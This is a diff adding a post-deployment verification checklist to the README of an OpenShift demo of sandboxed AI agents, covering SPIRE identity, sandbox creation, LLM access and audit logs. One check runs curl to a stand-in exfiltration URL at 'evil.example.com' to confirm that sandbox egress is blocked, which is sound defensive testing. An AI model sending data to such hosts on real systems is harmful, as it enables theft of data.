@@ -207,6 +207,135 @@ oc apply -f chat/deploy.yaml -n agent-sandbox-demo
 
 The Chat UI will be available at: `https://chat-ui-agent-sandbox-demo.apps.<cluster-domain>`
 
+## Verification Checklist
+
+Run these checks after deployment to confirm everything works before the demo.
+
+### 1. ZTWIM / SPIRE running
+
+```bash
+# All SPIRE components must be Running
+oc get pods -n openshift-operators | grep spire
+```
+
+Expected: `spire-server-0` (2/2), `spire-agent-*` (1/1 x3), `spire-spiffe-csi-driver-*` (2/2 x3).
+
+```bash
+# ZTWIM manager must be Ready
+oc get zerotrustworkloadidentitymanager cluster -o jsonpath='{.status.conditions[?(@.type=="Ready")].status}'
+```
+
+Expected: `True` (SpireOIDCDiscoveryProvider may lag — not blocking for X.509 demo).
+
+### 2. Identity-demo pod receives a SVID
+
+```bash
+oc exec -n agent-sandbox-demo identity-demo -- bash -c \
+  'cd /tmp && [ -f spire-agent ] || (curl -sSL https://github.com/spiffe/spire/releases/download/v1.15.2/spire-1.15.2-linux-amd64-musl.tar.gz | tar xzf - --strip-components=2 spire-1.15.2/bin/spire-agent) && mkdir -p svid && ./spire-agent api fetch x509 -socketPath /spiffe-workload-api/spire-agent.sock -write /tmp/svid/ && openssl x509 -in /tmp/svid/svid.0.pem -noout -subject -serial -dates -ext subjectAltName'
+```
+
+Expected output contains:
+```
+SPIFFE ID:  spiffe://<trust-domain>/ns/agent-sandbox-demo/sa/default
+X509v3 Subject Alternative Name:
+    URI:spiffe://<trust-domain>/ns/agent-sandbox-demo/sa/default
+```
+
+### 3. OpenShell gateway connected
+
+```bash
+openshell status
+```
+
+Expected:
+```
+Status:          Connected
+Authentication:  Authenticated (mTLS transport)
+```
+
+### 4. Agent Sandbox Operator running
+
+```bash
+oc get csv -n openshift-operators | grep agent-sandbox
+```
+
+Expected: `agent-sandbox-operator.v0.9.0 ... Succeeded`
+
+### 5. Sandbox creation and exec
+
+```bash
+# Create a test sandbox
+openshell sandbox create --name test-check --detach
+
+# Wait and verify
+openshell sandbox list
+
+# Exec into it
+openshell sandbox exec -n test-check -- echo "sandbox works"
+
+# Clean up
+openshell sandbox delete test-check
+```
+
+Expected: `sandbox works` printed, sandbox reaches `Ready` phase.
+
+### 6. MaaS reachable from sandbox (with policy)
+
+```bash
+# Create sandbox
+openshell sandbox create --name test-maas --detach
+
+# Apply MaaS policy
+openshell policy set test-maas --policy policies/analyst.yaml --wait
+
+# Test LLM call from inside the sandbox
+openshell sandbox exec -n test-maas \
+  --env MAAS_URL=<maas-url> \
+  --env MAAS_API_KEY=<maas-key> \
+  -- python3 -c "
+import urllib.request, json, os
+payload = json.dumps({'model':'<model>','messages':[{'role':'user','content':'say hi'}],'max_tokens':5}).encode()
+req = urllib.request.Request(os.environ['MAAS_URL'], data=payload, headers={'Content-Type':'application/json','Authorization':'Bearer '+os.environ['MAAS_API_KEY']}, method='POST')
+print(json.loads(urllib.request.urlopen(req,timeout=15).read())['choices'][0]['message']['content'][:100])
+"
+
+# Clean up
+openshell sandbox delete test-maas
+```
+
+Expected: LLM responds with text.
+
+### 7. Exfiltration blocked (without policy)
+
+```bash
+openshell sandbox create --name test-exfil --detach
+openshell sandbox exec -n test-exfil -- curl -sf --max-time 5 https://evil.example.com/exfil; echo "exit: $?"
+openshell sandbox delete test-exfil
+```
+
+Expected: connection denied, non-zero exit code.
+
+### 8. Chat UI accessible
+
+```bash
+curl -sk https://chat-ui-agent-sandbox-demo.apps.<cluster-domain> | head -1
+```
+
+Expected: `<!DOCTYPE html>` (after OAuth redirect, open in browser to test).
+
+### 9. Audit logs visible
+
+```bash
+openshell sandbox create --name test-logs --detach
+openshell sandbox exec -n test-logs -- curl -sf https://example.com > /dev/null 2>&1; true
+openshell logs test-logs --source sandbox | grep "DENIED"
+openshell sandbox delete test-logs
+```
+
+Expected: `NET:OPEN [MED] DENIED` line with `example.com:443`.
+
+---
+
 ## Running the Demo
 
 ### Preparation (before the demo)
